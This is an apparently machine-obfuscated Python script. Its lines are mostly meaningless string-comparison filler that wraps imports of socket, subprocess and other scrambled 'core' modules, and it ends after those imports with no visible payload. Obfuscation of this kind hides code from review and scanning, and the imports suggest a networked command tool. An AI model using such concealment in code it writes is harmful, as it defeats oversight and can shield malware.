#!/usr/bin/env python
aXhSdEzKhoRkrhgUFAmZobwFXNBAgLIHXoHiUrmYqpSLMkRKjAsrOGLhzGQwWePf = 'ZFgAnXSahzJqEdfOOBrgtxxwezkxKwiNYOtOZXHFhjAWWlpcrBQqRXhHXDeISbHT'
jTveswxWrLPlGEKvMhQWAQmvSdkveOqqvDbjpzsRSbJCWuMojpycTpmbvtNWMGHa = 'HNPaCVJyVTcFXXYHyMSqRbXaOVDSGVNwJmLbNtRGUJStSDRHUvntZLqumbSFjvPY'
TrkPkiFTTzLwBZgicwFHvYlLZcJjCdDiIiCxCfqgGxHQJoTDQoQIDzfSCkYKbXWc = 'bWYzMxGiivtrXvauaVxTxwQTmnMPbODXUdDzLATwnoIKRAkXLwsPqDsmRIForKtT'
if aXhSdEzKhoRkrhgUFAmZobwFXNBAgLIHXoHiUrmYqpSLMkRKjAsrOGLhzGQwWePf == jTveswxWrLPlGEKvMhQWAQmvSdkveOqqvDbjpzsRSbJCWuMojpycTpmbvtNWMGHa:
    bMpVUtAqdXmdQLohjClWIBVcKUjQRIzlTBNzdOhHpcYMHkCntSdiqusXFBfwFKrb = 'SMWLhxhaeUptOIKJLvoAydTDfmygCkImtaELSBwMBZiPDcZHBnvtoykXkrFxudLn'
    bMpVUtAqdXmdQLohjClWIBVcKUjQRIzlTBNzdOhHpcYMHkCntSdiqusXFBfwFKrb = aXhSdEzKhoRkrhgUFAmZobwFXNBAgLIHXoHiUrmYqpSLMkRKjAsrOGLhzGQwWePf
else:
    bMpVUtAqdXmdQLohjClWIBVcKUjQRIzlTBNzdOhHpcYMHkCntSdiqusXFBfwFKrb = 'SMWLhxhaeUptOIKJLvoAydTDfmygCkImtaELSBwMBZiPDcZHBnvtoykXkrFxudLn'
    bMpVUtAqdXmdQLohjClWIBVcKUjQRIzlTBNzdOhHpcYMHkCntSdiqusXFBfwFKrb = TrkPkiFTTzLwBZgicwFHvYlLZcJjCdDiIiCxCfqgGxHQJoTDQoQIDzfSCkYKbXWc
# -*- coding: utf-8 -*-
import socket
CKLGmkFWkHXgDYWhMqykXEpbXNeBFxKOGvOBnTdadeJqyXIgGFNBRSrwMVpdmYhK = 'VtJtAzoYyyTnlgmCnysekVmMKTHdwAcjdBcAMJUBWXRzuXpkfktsPYHbdBXTJdFU'
UVOWcRBCTaqzYcjWPRDLyeYCvnklTaYQlyptgJIWUDIiXeMbbtrWayaWiuAfhGPd = 'ACePPuDTYWEARxsFPApouIMYaAygpmwkITAdprnVGHYBRhzyOLzejlnufKuHTXXj'
DmrLGroVLmTKKwlgPoFPhJgwnrIPYipYXtaBdDCVqTcXtpvKWkdBUdxfBZmwqcmQ = 'biViAgtjuRyblKAvMPHKJedGShajTPkUALbxsYXpBrTjDYYwJrKXfDLQUBfrzfwg'
TeSACqlVbUPubsToUsxcOkaqOpiTCHpxazGJojvnGdPSbGVFDAAZUjLtplgvzUXo = 'QIdZuriUrOCEHBPQzxlhCxUMxubMCivFysojkjiAsmEUQgeCUGLyOnOBtUmJfSyN'
DccJzcmOnsxtspVVBjMgUbkvXBjBBtygmxSPjbnvxzvKpaUSzTOKuZsXXrOkWBMV = 'dPKaFBvKfPXopNHMidrBgwCPERlURhCFUUZLegQOyoDthvOmEDlAYVMWgIOlELjt'
hZMylhtNFeThJFMPqwjKENsIKwlgvLYtaTjmkbSmTZGTeyLtlWZBkGBxuAlhOhgH = 'jCstoOJesIciAvTMTxLWBxoaRbgGqrwjJzMcHJFiywxFMxQojUDmGyWzcuwZKorW'
if DmrLGroVLmTKKwlgPoFPhJgwnrIPYipYXtaBdDCVqTcXtpvKWkdBUdxfBZmwqcmQ == TeSACqlVbUPubsToUsxcOkaqOpiTCHpxazGJojvnGdPSbGVFDAAZUjLtplgvzUXo:
    for hZMylhtNFeThJFMPqwjKENsIKwlgvLYtaTjmkbSmTZGTeyLtlWZBkGBxuAlhOhgH in DccJzcmOnsxtspVVBjMgUbkvXBjBBtygmxSPjbnvxzvKpaUSzTOKuZsXXrOkWBMV:
        if hZMylhtNFeThJFMPqwjKENsIKwlgvLYtaTjmkbSmTZGTeyLtlWZBkGBxuAlhOhgH == TeSACqlVbUPubsToUsxcOkaqOpiTCHpxazGJojvnGdPSbGVFDAAZUjLtplgvzUXo:
            DccJzcmOnsxtspVVBjMgUbkvXBjBBtygmxSPjbnvxzvKpaUSzTOKuZsXXrOkWBMV = CKLGmkFWkHXgDYWhMqykXEpbXNeBFxKOGvOBnTdadeJqyXIgGFNBRSrwMVpdmYhK
        else:
            TeSACqlVbUPubsToUsxcOkaqOpiTCHpxazGJojvnGdPSbGVFDAAZUjLtplgvzUXo = UVOWcRBCTaqzYcjWPRDLyeYCvnklTaYQlyptgJIWUDIiXeMbbtrWayaWiuAfhGPd
import subprocess
HcMgIDFsMZDKwoBCDFyRDMpjOYdWxsQbtMjPynXrtaVlIKqAFQyfjCBxDEsSUkqX = 'CpQPneDnDnfiygaxUIHKDCpSQpoUBVGFFrfBbWRiHJUKheFBfozLcDBlgJPohoUG'
ljcKXVAGKATBKXXTXvtsnVRGEYmUWWfQpyVPLdLtwtYSULxBnNiUNzsFRjVOCxRe = 'glYRElnBgajWcqQmXgVepWccefDsZSVkskmuauZOAvHuoNbrHlrZXQOyMjniNGdq'
drFuBORHTUpvjuHIVEMNorpCBmCwFwTchalUbyRGwFCZlIGYIZhrWHKPYRBtYvDx = 'qQkKGGjoGtGRCbZMSnMUprXpXcLNYoWXGHfgUJfrHohPDHWaGYJMvIvZzIXTDKxf'
if HcMgIDFsMZDKwoBCDFyRDMpjOYdWxsQbtMjPynXrtaVlIKqAFQyfjCBxDEsSUkqX == ljcKXVAGKATBKXXTXvtsnVRGEYmUWWfQpyVPLdLtwtYSULxBnNiUNzsFRjVOCxRe:
    QkdeqDlEDkuOeNVGDNpJVkJGcGWtVxDSPnXBXANUHDNLitelMYhdWgZacDZiixgE = 'ADvSQuUSvPoIAgyJmBbtxdFWBTzlnQlebAKLIrILBSkVffTbdCiamigdRLGfmiDu'
    QkdeqDlEDkuOeNVGDNpJVkJGcGWtVxDSPnXBXANUHDNLitelMYhdWgZacDZiixgE = HcMgIDFsMZDKwoBCDFyRDMpjOYdWxsQbtMjPynXrtaVlIKqAFQyfjCBxDEsSUkqX
else:
    QkdeqDlEDkuOeNVGDNpJVkJGcGWtVxDSPnXBXANUHDNLitelMYhdWgZacDZiixgE = 'ADvSQuUSvPoIAgyJmBbtxdFWBTzlnQlebAKLIrILBSkVffTbdCiamigdRLGfmiDu'
    QkdeqDlEDkuOeNVGDNpJVkJGcGWtVxDSPnXBXANUHDNLitelMYhdWgZacDZiixgE = drFuBORHTUpvjuHIVEMNorpCBmCwFwTchalUbyRGwFCZlIGYIZhrWHKPYRBtYvDx
import struct
KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv = 'nQCCawKJKALjThEeZnyZTYlbJBeAgTnYzRTkzjEuLmsQBHZeoOvfAIPfmUqtbmJg'
pnbWHyOAgSAaDAUjgNhOGOOPToCVxfkUUGCjIBcfJCzZOtZyRLnJeskQyUVOBhbh = 'ksTgSESYLWrgBDCQAMACPPiClmBqtXIwbWECkpQsLWNjUXuMQWQMbwOpjyeCobuh'
IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv = 'QPcCnIeaUAlmomJzIWXEVfLERQCgkbRFdsTaBwWnhJlktvKHaDWlyslLGLtcttkU'
eKujfBmTHzZIntntPjJrmWPCMjXPdwtNTLmshMXoucggyuMRkrtyjJrWaHuYhnLE = 'mSuZsNJcgDMNfZJWLeCPNExphedPzDNLSDJrVoqiywpcdiWPjOcoMxFFvkfbEwiH'
KpYPrAOvsrQNJWfmwZKFWnpeJyLVGJgTsqSUMhtiOJyQVCHUNNiUVcvDUVOpExgQ = 'jANbKOnHddQkrIGpRmKKEwEozZnVfuOhIwstdYmKNisVKkXXEwPlHlvSwTDJBtwI'
eNRHOkiKJIZyWHCwdXztZCmrkREUtibzgODQbfVpEaCFEvTruvYrVGsSxsegxSjV = 'hKzepsFiukMqLGQMnJxQZKtQlEZoiIFgyVFfZMFRdTtHqjOTirMyjslrIWMYxoRX'
if KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv != eKujfBmTHzZIntntPjJrmWPCMjXPdwtNTLmshMXoucggyuMRkrtyjJrWaHuYhnLE:
    pnbWHyOAgSAaDAUjgNhOGOOPToCVxfkUUGCjIBcfJCzZOtZyRLnJeskQyUVOBhbh = IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv
    for eNRHOkiKJIZyWHCwdXztZCmrkREUtibzgODQbfVpEaCFEvTruvYrVGsSxsegxSjV in eKujfBmTHzZIntntPjJrmWPCMjXPdwtNTLmshMXoucggyuMRkrtyjJrWaHuYhnLE:
        if eNRHOkiKJIZyWHCwdXztZCmrkREUtibzgODQbfVpEaCFEvTruvYrVGsSxsegxSjV != IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv:
            pnbWHyOAgSAaDAUjgNhOGOOPToCVxfkUUGCjIBcfJCzZOtZyRLnJeskQyUVOBhbh = pnbWHyOAgSAaDAUjgNhOGOOPToCVxfkUUGCjIBcfJCzZOtZyRLnJeskQyUVOBhbh
        else:
            KpYPrAOvsrQNJWfmwZKFWnpeJyLVGJgTsqSUMhtiOJyQVCHUNNiUVcvDUVOpExgQ = KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv
else:
    IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv = KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv
    KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv = KpYPrAOvsrQNJWfmwZKFWnpeJyLVGJgTsqSUMhtiOJyQVCHUNNiUVcvDUVOpExgQ
    if IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv == KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv:
        for eNRHOkiKJIZyWHCwdXztZCmrkREUtibzgODQbfVpEaCFEvTruvYrVGsSxsegxSjV in KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv:
            if eNRHOkiKJIZyWHCwdXztZCmrkREUtibzgODQbfVpEaCFEvTruvYrVGsSxsegxSjV == IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv:
                IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv = KKYFwrhdWhFJXmQQEWEdhejqzDBtlzegfWrKjmedmluaBhKlnsKHJzgMytPTKjBv
            else:
                IbTYPKHJDRtSaTcPszFcygMqiMXiPriKLJKRkoFIvRXXYCHKfFLsSWcDydOXOUnv = KpYPrAOvsrQNJWfmwZKFWnpeJyLVGJgTsqSUMhtiOJyQVCHUNNiUVcvDUVOpExgQ
import sys
ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy = 'LowQlHMlifMXWSoEsXfhyLETcfKZJNkAPeATHpVDVOaIIyUJWAWRFhmRrGwEDqUL'
uARRNZrubPvSPArpqlnOsPnCIrRgvjLrkWinaYbdruomitdsqetpOvhToSKCodbL = 'rrhJEgBvRZAuLnnytdaFOfYOUkeeTThritMAvndOxaRtlvtjFPYmIfInNbiVGywM'
FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV = 'yQrgJdvNNcVYZsckgNQBsogeznXIjzYNsccWnSuXRYbaMYPNtGllLOxmWLwPTdWR'
vWVexTLBFRiqrSlqBrFuLXxIvEboknTUOOYHsLmGtVWDCUQRLMNWtKmTMdCmVUSh = 'cerzZbDtdATgwPLEItCalrlIyXdlNYmcqqWdmHxgSROsczfmjserpRhXSLMAOqoR'
wjJHCihypczIOPUaKjMjMzRCQAgmBZxeAsGlhskhbibxIcdZbHDWXFCThJOJpQdN = 'kPkyMhHZpaGJsUixFhTYzCjPGLUdSymVMMwxQCRvhOmIiDQbYhjyJTsKkoHHQWOU'
KMEymAbwHSbNymCUZstLeXeJBgHGGcyKeWqdqRnNeqozggeAVJzGIDTwQHPGLzDF = 'wswItcFdErJGCwLjRgYUxvaYXSfcprlYVwQUZvLhGqYlUydmOGrovJGiabSNJyHC'
if ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy != vWVexTLBFRiqrSlqBrFuLXxIvEboknTUOOYHsLmGtVWDCUQRLMNWtKmTMdCmVUSh:
    uARRNZrubPvSPArpqlnOsPnCIrRgvjLrkWinaYbdruomitdsqetpOvhToSKCodbL = FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV
    for KMEymAbwHSbNymCUZstLeXeJBgHGGcyKeWqdqRnNeqozggeAVJzGIDTwQHPGLzDF in vWVexTLBFRiqrSlqBrFuLXxIvEboknTUOOYHsLmGtVWDCUQRLMNWtKmTMdCmVUSh:
        if KMEymAbwHSbNymCUZstLeXeJBgHGGcyKeWqdqRnNeqozggeAVJzGIDTwQHPGLzDF != FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV:
            uARRNZrubPvSPArpqlnOsPnCIrRgvjLrkWinaYbdruomitdsqetpOvhToSKCodbL = uARRNZrubPvSPArpqlnOsPnCIrRgvjLrkWinaYbdruomitdsqetpOvhToSKCodbL
        else:
            wjJHCihypczIOPUaKjMjMzRCQAgmBZxeAsGlhskhbibxIcdZbHDWXFCThJOJpQdN = ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy
else:
    FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV = ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy
    ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy = wjJHCihypczIOPUaKjMjMzRCQAgmBZxeAsGlhskhbibxIcdZbHDWXFCThJOJpQdN
    if FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV == ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy:
        for KMEymAbwHSbNymCUZstLeXeJBgHGGcyKeWqdqRnNeqozggeAVJzGIDTwQHPGLzDF in ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy:
            if KMEymAbwHSbNymCUZstLeXeJBgHGGcyKeWqdqRnNeqozggeAVJzGIDTwQHPGLzDF == FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV:
                FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV = ROTHcRaTGAqxnRdyJsyIHlHNmWcYaAOwjVINlZZgrgioZWjtDaYPsGJLuIsIIQJy
            else:
                FEpGIeJETGlbEZlcfdKqMXjLjQyviKCuNNBbjnhVIePWglTUgIRKashReNENSDaV = wjJHCihypczIOPUaKjMjMzRCQAgmBZxeAsGlhskhbibxIcdZbHDWXFCThJOJpQdN
try:
    YddBZeaKiaHhwTefOYARPyCSpGQrMytuUhQdVyldHJXzLyjYeVGoEYZOUhKeOZDL = 'NzNcpPnVYRuUfuBwkKonBgOSDRyHrPmhyoZfXeujTkChrTZZZJtiLkcVIVLQYZGu'
    gCujLtHfoxtpquOTWpwpVlazfdgrzXJRkIVnDolqDeCmELBiXIbiQEGSOhdkJRTB = 'etkGOLHpGxXhTJYGhpTJwuSDYUGiNqSxwQOffGCkDbOheXyewRiHybZpytWyFxck'
    if YddBZeaKiaHhwTefOYARPyCSpGQrMytuUhQdVyldHJXzLyjYeVGoEYZOUhKeOZDL != gCujLtHfoxtpquOTWpwpVlazfdgrzXJRkIVnDolqDeCmELBiXIbiQEGSOhdkJRTB:
        PFffTgnadKfcOGIxhFZvWnyTFQAHkhXOgNmfAANojpgbygeyVSfrNuWorkbbOJDm = 'LshqgdntIbKPaokrDmRWBuIDwHNTdXTgmktGDBiqKCYOUsLBLZBTtqpJUSFGeysu'
        osQHLnIMsDygduiyQtDHNBmQFYAWGuBTYSuXLLvJPqQuNenLGGlQwOeeCAXMSlQk = 'vMejuuBxGDWZTYtXdPaSGOrPCMBqtLTdcVtMtJJZsrnqauNzfpyHXClOztIQtVFa'
        osQHLnIMsDygduiyQtDHNBmQFYAWGuBTYSuXLLvJPqQuNenLGGlQwOeeCAXMSlQk = PFffTgnadKfcOGIxhFZvWnyTFQAHkhXOgNmfAANojpgbygeyVSfrNuWorkbbOJDm
    from core.VdhWHphnBOFufHFXmSdjHkrVcnvaRNwOEugsoiQWFfISinBvXleIxEynhpFPOLvF import gzbycLsDIoAAIdkKrPhXzOCBShxQOsZnySBSMqTNGnQftXQwITlzDOwUPzFObZoY, aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE, ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr
    ZUPQYAdDNFAzoEfaUdJIqrHdDlMdXwfMsapuWyAQnPgTgIucjPKTXjvIqyAUjmdd = 'jpyKSCKyoXYGxNYNkkqAAWlqSwHdKcuKkRzLvIUBNVVegzrXEjBnofadYXKftpwB'
    xruqNkEIrxhfGkWmVBSFWZkqErBoMOzuORajMpsBlqrRUdIwysZOQndJlJSjPUph = 'LxTXypzdyVEpWXaGAonSpbqLMSTryfSXGEIJKRdKZzvugfTdLHxBOOqXHnIifVEs'
    HQEaqGXhgLkvejpNtxhtDPTkwIfVUxkoyqGLwyFsEMDQDoJPCiOvreoCeyyYLENC = 'gulfnlfkJSsDpKFalZRPKUjbnvVUxoLeepzMwgLJlItnPilDvclLyIkVkMHevwQn'
    soEmXVWDnraqTcOyDxtmNVueHrmZrDfsUdpwtwDFJYcQudkSQYJehRQujiNtLoht = 'gUPwxsMcsFyVYfDtHRtlHuCNwxREflxGjaYchfrwYssdNwLXbOCarJyIVIbvESzQ'
    WsFJlXskcIGMgXQdJawYtQLQDrlVENzvkQbZwplVoSzeZdOBYagzwCoQUTYevUft = 'sCkIUBEgIkRURLheyQOODhtJXdMwCNcxYHcKnzfFFRmPAkLYjvncSnXcEsOEwytF'
    orVyiBwMRWnaAfoDZMfjubHvjYXRUKEDPXZQWPTQDZHdJXRsxZIjZoRWOcOfZtTo = 'NklRbZCvGdqbGYZrMkgwSTELATVYFUcPDrxlhUfKJHJDnPmHUTNNLogitvWQlohs'
    if HQEaqGXhgLkvejpNtxhtDPTkwIfVUxkoyqGLwyFsEMDQDoJPCiOvreoCeyyYLENC == soEmXVWDnraqTcOyDxtmNVueHrmZrDfsUdpwtwDFJYcQudkSQYJehRQujiNtLoht:
        for orVyiBwMRWnaAfoDZMfjubHvjYXRUKEDPXZQWPTQDZHdJXRsxZIjZoRWOcOfZtTo in WsFJlXskcIGMgXQdJawYtQLQDrlVENzvkQbZwplVoSzeZdOBYagzwCoQUTYevUft:
            if orVyiBwMRWnaAfoDZMfjubHvjYXRUKEDPXZQWPTQDZHdJXRsxZIjZoRWOcOfZtTo == soEmXVWDnraqTcOyDxtmNVueHrmZrDfsUdpwtwDFJYcQudkSQYJehRQujiNtLoht:
                WsFJlXskcIGMgXQdJawYtQLQDrlVENzvkQbZwplVoSzeZdOBYagzwCoQUTYevUft = ZUPQYAdDNFAzoEfaUdJIqrHdDlMdXwfMsapuWyAQnPgTgIucjPKTXjvIqyAUjmdd
            else:
                soEmXVWDnraqTcOyDxtmNVueHrmZrDfsUdpwtwDFJYcQudkSQYJehRQujiNtLoht = xruqNkEIrxhfGkWmVBSFWZkqErBoMOzuORajMpsBlqrRUdIwysZOQndJlJSjPUph
    from core.CKTOXmRTSSqMVhXFpFrbrLPAbfrEpWaBapWDGDyngpfMmXVMSsQgAehNYVhjGKYK import FRoDRlsJIAlzmRsiLfnTwPbAAJhNPzLZiqmTHwMxrMnMNWnHWWCvyIklDxFOqKIe, gyEOxeZsdJwUGZYgHHjnAcyVnMSFdVEoTXtZeIXivuMhKxmmOUmZwswTamNUpaob
    NOyylDAeaOUsNKGeasjeWtUbyBVNlmtmdZbTMAQRDbDRKstHHeWnwsOvEobAXpgE = 'sAgWbGFnWkynhzttEzwajZVGxoSyJhpeiRvFQvyCWdKfAeWPwdkESgwggvrboXKH'
    NsGAlqRFlqELAfzWoiZZgdPfhdHuAzfnVPpMpxrPlqfXEJJgwWXHDnwpYvsUXDRO = 'TgJHVGiJJAtVJElqnyVlQOoBQjoGsVGWOXUACxHvvguuIcKXDmDutXYFzQRAJjPG'
    uJiXWFRcZLYSYXIOhIvaBeHekFPLPPDSBHqGuGsFDqjmPcxLiUGJTTrjzLOJwDoy = 'UrCBbBKZzXLGfBnzHepLyuydEWbOdAXEJHIBnLttfmAqDLvkZmdjDwKlbwnzXFQJ'
    OcyQURVpGNnABXzHSMcXLTRwqcbzwQSmtoQIZxhBRrLMsugcQhEbBVoQjHvFnoPe = 'adResTSHylyoRIZZwGQDdzzMpSsXGdAjPKGHEifeFwtjLtPvejEMrkMXlINTazLc'
    LuHEtTRVsdIOIcUZpnalSHUkpbqVwmSzOcdodrHOljAngedIMRtTTRkglhMgapbI = 'witSHgUIDeOTazLsRgjzYKiAUwRAJTJNdOauNpBIRyBywRFCZPwNopoeLqIbOUUC'
    xWsLTtTSuknKKnKbNVcDwpjVjFLGXBdVGnaRJJNbXcTeAflxPijmvOzzyqQkjhdD = 'hntLHJlxbHTiVOqznXPhvXAcZjpPxcVHFRsQFPuqJHUZRhHxahpkjZRXTkWrqiFk'
    if uJiXWFRcZLYSYXIOhIvaBeHekFPLPPDSBHqGuGsFDqjmPcxLiUGJTTrjzLOJwDoy == OcyQURVpGNnABXzHSMcXLTRwqcbzwQSmtoQIZxhBRrLMsugcQhEbBVoQjHvFnoPe:
        for xWsLTtTSuknKKnKbNVcDwpjVjFLGXBdVGnaRJJNbXcTeAflxPijmvOzzyqQkjhdD in LuHEtTRVsdIOIcUZpnalSHUkpbqVwmSzOcdodrHOljAngedIMRtTTRkglhMgapbI:
            if xWsLTtTSuknKKnKbNVcDwpjVjFLGXBdVGnaRJJNbXcTeAflxPijmvOzzyqQkjhdD == OcyQURVpGNnABXzHSMcXLTRwqcbzwQSmtoQIZxhBRrLMsugcQhEbBVoQjHvFnoPe:
                LuHEtTRVsdIOIcUZpnalSHUkpbqVwmSzOcdodrHOljAngedIMRtTTRkglhMgapbI = NOyylDAeaOUsNKGeasjeWtUbyBVNlmtmdZbTMAQRDbDRKstHHeWnwsOvEobAXpgE
            else:
                OcyQURVpGNnABXzHSMcXLTRwqcbzwQSmtoQIZxhBRrLMsugcQhEbBVoQjHvFnoPe = NsGAlqRFlqELAfzWoiZZgdPfhdHuAzfnVPpMpxrPlqfXEJJgwWXHDnwpYvsUXDRO
    from core.kOojIcPzqGABFTLWZcMaPjQiyuisDASkvUWrhdHOHbgqnAGFybMhogyIcPpomvtX import MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP
    PuZinbVtBjCPZrqyvyinoTCyagntRxQliRLTpGCvUKGnedEGhjsjSjtmTDXWXLmH = 'gzeUvcBzCdpYKHxLwKDJODvornOektRvlQaghrLRXmEulxPLKCsEEHSFfRIdXQZE'
    nuOztbrXeuwNEsnkXkVjqkKEqMhfqhuxXoPWaeboPPnKKZQjHSRctaGJzZMDbnng = 'LawtHauJUqyWPBcOeTPeDVSVzIytNzdOeGOVsNWIszrtKLhXfxqytmJqafABgAsN'
    if PuZinbVtBjCPZrqyvyinoTCyagntRxQliRLTpGCvUKGnedEGhjsjSjtmTDXWXLmH != nuOztbrXeuwNEsnkXkVjqkKEqMhfqhuxXoPWaeboPPnKKZQjHSRctaGJzZMDbnng:
        rluNVCpcflmRgQcgwxYDtwOiXSKyylNDuYruWiSguGlQezhnuRZhenOOukhBuUiA = 'SmtxGANZIyJVwiKuYvhLKYDwunisDVZBodzLHqtivZuRQdciHAhAnVYGDohGvCvC'
        hxbJBBmSBbEGcPBgFeyqkOgCesqsEzTyBcOMwjEqrEEXGzBVUFPbMlmgGKulZiWm = 'ebIJviLQOmtmSKGEQudmozOSFGutuylLikEdaPIsIreYWdVwLzsVrFzNiTzYYvrJ'
        hxbJBBmSBbEGcPBgFeyqkOgCesqsEzTyBcOMwjEqrEEXGzBVUFPbMlmgGKulZiWm = rluNVCpcflmRgQcgwxYDtwOiXSKyylNDuYruWiSguGlQezhnuRZhenOOukhBuUiA
    from core.PUipRuaUaQKClCqOGQclfUXYEnNOHcSWHGwDzbtUAXtQmZxkPpCYukfAorAOSLam import jANnrqLDCAEfkgFTduiUjLLoWvNOXRIWSAfakIBQROyTBCbyDjUIOyFqHWLZjXow
    kTrevxFCeJwKsBQlxiaaNZYripwZWKOrqWZzsawwxBsQLSLTBtIcJhbqykdaIkKm = 'TuwTeKWXBJLecgaSbNadCPVOElUyamRHFAWwjCpaemxKUxZyYTRCVoEbkVOVQXYv'
    yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI = 'IyYPzMrEHTxXqXufQRTaHRTRgHrwXZLvSodrZKAdraNEyXKVpsfBvPuVBNKJbZCT'
    qgstrFznSoWcYuIAZjhSxEQDnVQqMoblmrrsKkMLmWFEmRlUFMxQEBIYEAyGMKLn = 'KoDKgbvOdmlGTCWKzcAfBwKuMZQueOgeGqwUdMwlWeDTufwGJDZtKiOfIkVEipco'
    CwiqYWnqeMnLkPNirFuEmgTzgAMEhnwjUpswzJyXnYuCSzKupDRqNyQyHhLVyjUA = 'gBMEQXzhCKzTstIKMQCmWEobbTcFuudPdiPVOyTgGkEHcZKIWALyzCORxXnhVZPi'
    gMumWIcrHRAXHmyLOrIMedgccBILFXapEyFsbEADLlShsSFbRcqltlaJYSRVmzOK = 'nWKHPovaauDLqEyOcdZQbuTDlKQmLwKFaIaTEyosdUnaAwrUwIBsEYqoHmbNQTPQ'
    if kTrevxFCeJwKsBQlxiaaNZYripwZWKOrqWZzsawwxBsQLSLTBtIcJhbqykdaIkKm in yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI:
        kTrevxFCeJwKsBQlxiaaNZYripwZWKOrqWZzsawwxBsQLSLTBtIcJhbqykdaIkKm = gMumWIcrHRAXHmyLOrIMedgccBILFXapEyFsbEADLlShsSFbRcqltlaJYSRVmzOK
        if yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI in qgstrFznSoWcYuIAZjhSxEQDnVQqMoblmrrsKkMLmWFEmRlUFMxQEBIYEAyGMKLn:
            yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI = CwiqYWnqeMnLkPNirFuEmgTzgAMEhnwjUpswzJyXnYuCSzKupDRqNyQyHhLVyjUA
    elif yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI in kTrevxFCeJwKsBQlxiaaNZYripwZWKOrqWZzsawwxBsQLSLTBtIcJhbqykdaIkKm:
        qgstrFznSoWcYuIAZjhSxEQDnVQqMoblmrrsKkMLmWFEmRlUFMxQEBIYEAyGMKLn = yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI
        if qgstrFznSoWcYuIAZjhSxEQDnVQqMoblmrrsKkMLmWFEmRlUFMxQEBIYEAyGMKLn in yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI:
            yTqDNOWXLgURZsDPVLGktcvOpnXguvJpAxthnAZVfxvMUeWqvkYCOySOuMOTFFSI = gMumWIcrHRAXHmyLOrIMedgccBILFXapEyFsbEADLlShsSFbRcqltlaJYSRVmzOK
    from core.hLwrgXaCniQuIuEiFVScXrlfWNJZInMENdrlJwAasqUITFPMpiRbcPJcRbGYkDVK import MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP
    LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC = 'GMTGELiGPjAfCGokiDnuQTLOQBdYHrTkVGmfFVplMBpVtJIHUUhezxtrUeNEPZva'
    fLeTKZXfDiJqNFFuoUBSKEiquRaFpCEbtmPDoiSULIeQQFnGkUTjNeFtAthOEykQ = 'PGGqVMFeraPpfgcvfvQdUfRJnRqQlNzcPUtzmrvnQgGkDUlijurctPeUiBDlUUYf'
